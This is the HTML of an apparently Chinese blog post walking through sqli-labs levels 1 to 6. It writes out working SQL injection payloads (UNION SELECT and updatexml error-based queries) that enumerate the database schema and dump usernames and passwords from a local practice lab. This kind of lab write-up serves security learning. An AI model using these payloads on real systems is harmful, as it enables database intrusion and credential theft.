@@ -1,0 +1,1350 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="running">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sqlilab题解&amp;&amp;总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilab题解&amp;&amp;总结">
+<meta property="og:url" content="http://example.com/2025/10/27/sqlilab%E9%A2%98%E8%A7%A3&&%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="running">
+<meta property="og:description" content="sqlilab题解&amp;&amp;总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201017611.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201020801.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201025778.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201027588.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201030674.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201032668.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201036767.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201039841.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201047696.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201052792.png">
+<meta property="og:image" content="c:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250303210120634.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201056146.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201100207.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201104011.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201107729.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201112138.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201116206.png">
+<meta property="og:image" content="c:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250304133349636.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201121578.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201126096.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201129817.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201138247.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201140608.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201143027.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201144214.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201145243.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201146678.png">
+<meta property="og:image" content="c:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250305185740234.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201148030.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201149812.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201151227.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201156027.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201206189.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201208232.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201210310.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201211474.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201212847.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201213782.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201219296.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201221348.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201223817.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201225844.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201232792.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201244881.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201252794.png">
+<meta property="article:published_time" content="2025-10-27T12:23:00.000Z">
+<meta property="article:modified_time" content="2025-10-27T12:23:30.872Z">
+<meta property="article:author" content="running">
+<meta property="article:tag" content="靶场题解">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201017611.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>sqlilab题解&amp;&amp;总结 - running</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>running</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sqlilab题解&amp;&amp;总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-27 20:23" pubdate>
+          2025年10月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          65 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sqlilab题解&amp;&amp;总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="闭合报错"><a href="#闭合报错" class="headerlink" title="闭合报错"></a>闭合报错</h1><ul>
+<li><pre><code class="hljs">?id=1’
+?id=1”
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>  - 如果都报错，则为整形闭合<br><br>    尝试?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>--+<br><br>    - 无报错则整形闭合。报错则整形加括号<br><br>  - 如果单引号报错，双引号不报错<br><br>    尝试?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;--+<br>  <br>    - 无报错则单引号闭合。报错则单引号加括号<br>  <br>  - 如果单引号不报错，双引号报错。<br>    尝试?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&quot;–+</span><br><span class="hljs-string">  </span><br><span class="hljs-string">    - 无报错则双引号闭合。报错则双引号加括号。</span><br><span class="hljs-string"></span><br><span class="hljs-string"># sqlilab</span><br><span class="hljs-string"></span><br><span class="hljs-string">## 1（联合注入）</span><br><span class="hljs-string"></span><br><span class="hljs-string">第一关反馈数字为字符型</span><br><span class="hljs-string"></span><br><span class="hljs-string">注入需要**？id=1’**</span><br><span class="hljs-string"></span><br><span class="hljs-string">- &lt;img src=&quot;</span>https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200843970</span>.png<span class="hljs-string">&quot; alt=&quot;</span>image<span class="hljs-number">-20250303140526440</span><span class="hljs-string">&quot; style=&quot;</span>zoom:<span class="hljs-number">33</span>%<span class="hljs-comment">;&quot; /&gt;</span><br><br>  使用？id<span class="hljs-operator">=</span>xx测试<br><br>  ![image<span class="hljs-number">-20250303140624439</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200845249</span>.png)<br><br>- 拆解<br><br>  ![image<span class="hljs-number">-20250303141258773</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200848557</span>.png)<br><br>  有<span class="hljs-number">3</span>段<br><br>- ![image<span class="hljs-number">-20250303141414242</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200851484</span>.png)<br><br>  爆出数据所在位置<br><br>- ![image<span class="hljs-number">-20250303141609972</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200853667</span>.png)<br><br>  爆出版本和库名<br><br>- ![image<span class="hljs-number">-20250303141852965</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200858277</span>.png)<br><br>  查所有表名<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  http:</span>//sqli-labs-master:<span class="hljs-number">82</span>/Less<span class="hljs-number">-1</span>/?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>information_schema.tables<span class="hljs-variable">%20</span>where<span class="hljs-variable">%20</span>table_schema<span class="hljs-operator">=</span><span class="hljs-variable">%27</span>security<span class="hljs-variable">%27</span>--+<br><br>- 用户的账号密码大概率在user![image<span class="hljs-number">-20250303142024485</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200907510</span>.png)<br><br>  查列名（得到id）<br><br>- ![image<span class="hljs-number">-20250303143004111</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200909384</span>.png)<br><br>  查询user下的所有列名（得到username  passward）<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  http:</span>//sqli-labs-master:<span class="hljs-number">82</span>/Less<span class="hljs-number">-1</span>/?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>information_schema.columns<span class="hljs-variable">%20</span>where<span class="hljs-variable">%20</span>table_name<span class="hljs-operator">=</span><span class="hljs-variable">%27</span>users<span class="hljs-variable">%27</span>--+<br><br>- 得到对应数据<br><br>  ![image<span class="hljs-number">-20250303143244252</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200934849</span>.png)<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  http:</span>//sqli-labs-master:<span class="hljs-number">82</span>/Less<span class="hljs-number">-1</span>/?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(username<span class="hljs-variable">%20</span><span class="hljs-punctuation">,</span>id<span class="hljs-variable">%20</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span>password)<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>users--+<br><br>## <span class="hljs-number">2</span><br><br>- ![image<span class="hljs-number">-20250303143820028</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200939723</span>.png)<br><br>  ![image<span class="hljs-number">-20250303143841256</span>](https://cdn.jsdelivr.net/gh/zhz<span class="hljs-number">0177</span>/picture-bed<span class="hljs-title">@main</span>/img/<span class="hljs-number">20251027200943709</span>.png)<br><br>   第二关**无**数字反馈 为数字型  <br><br>  注入需要**？id<span class="hljs-operator">=</span><span class="hljs-number">1</span>**<br><br>  <br><br></code></pre></td></tr></table></figure>
+?id=1 order by 3
+?id=-1 union select 1,2,3
+?id=-1 union select 1,database(),version()
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;
+?id=-1 union select 1,2,group_concat(username ,id , password) from users
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>  一步一步来<br><br>- ![image-20250303144100313](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200951228.png)<br><br>  分段<br><br>- ![image-20250303144127923](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200954804.png)<br><br>  爆出数据所在位置<br><br>- ![image-20250303144243223](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027200958809.png)<br><br>- ![image-20250303144258358](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201002264.png)<br><br>- ![image-20250303144321219](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201006378.png)<br><br>- ![image-20250303144339430](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201010066.png)<br><br><span class="hljs-comment">## 3</span><br><br>- ![image-20250303144432279](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201014052.png)<br><br>  测试出现括号，	且为字符型<br><br>- ```<br>  ?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;)--+（闭合括号）</span><br><span class="hljs-string">  ?id=1&#x27;</span>) order by 3--+<br>  ?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27;) union select 1,2,3--+</span><br><span class="hljs-string">  ?id=-1&#x27;</span>) union <span class="hljs-keyword">select</span> 1,database(),version()--+<br>  ?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">  ?id=-1&#x27;</span>) union <span class="hljs-keyword">select</span> 1,2,group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>  ?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></code></pre></td></tr></table></figure>
+
+一步一步来
+</code></pre>
+</li>
+</ul>
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201017611.png" srcset="/img/loading.gif" lazyload alt="image-20250303151047094"></p>
+<p>单引号无报错</p>
+<p>使用双引号测试</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201020801.png" srcset="/img/loading.gif" lazyload alt="image-20250303151140123"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;) order by 3--+（使用双引号测试）（闭合括号）<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,3--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,database(),version()--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,group_concat(username ,id , password) <span class="hljs-keyword">from</span> users--+<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="5（报错注入）"><a href="#5（报错注入）" class="headerlink" title="5（报错注入）"></a>5（报错注入）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201025778.png" srcset="/img/loading.gif" lazyload alt="image-20250303151433521"></p>
+<p>字符型</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201027588.png" srcset="/img/loading.gif" lazyload alt="image-20250303151505518"></p>
+<p>页面无回显（不能使用联合注入）</p>
+</li>
+<li><p>报库（报错注入）<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201030674.png" srcset="/img/loading.gif" lazyload alt="image-20250303152134366"></p>
+<p><a target="_blank" rel="noopener" href="http://sqli-labs-master:82/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20database()),0x7e),1)%20--+">http://sqli-labs-master:82/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20database()),0x7e),1)%20--+</a></p>
+<p>0x7e是波浪线</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201032668.png" srcset="/img/loading.gif" lazyload alt="image-20250303152300995"></p>
+<p>报表（全部）（在user概率较大）</p>
+<p><a target="_blank" rel="noopener" href="http://sqli-labs-master:82/Less-5/?id=1">http://sqli-labs-master:82/Less-5/?id=1</a>‘ and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1) –+</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201036767.png" srcset="/img/loading.gif" lazyload alt="image-20250303152637118"></p>
+<p>爆列</p>
+<p><a target="_blank" rel="noopener" href="http://sqli-labs-master:82/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(column_name)),0x7e)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27),0x7e),1)--+">http://sqli-labs-master:82/Less-5/?id=1%27%20%20and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(column_name)),0x7e)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27),0x7e),1)--+</a></p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201039841.png" srcset="/img/loading.gif" lazyload alt="image-20250303152911332"></p>
+<p><a target="_blank" rel="noopener" href="http://sqli-labs-master:82/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(username,id,password)),0x7e)%20from%20users%20),0x7e),1)%20--+">http://sqli-labs-master:82/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(select%20distinct%20concat(0x7e,%20(select%20group_concat(username,id,password)),0x7e)%20from%20users%20),0x7e),1)%20--+</a></p>
+<p>得到数据</p>
+</li>
+</ul>
+<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201047696.png" srcset="/img/loading.gif" lazyload alt="image-20250303153000044"></p>
+<p>使用双引号</p>
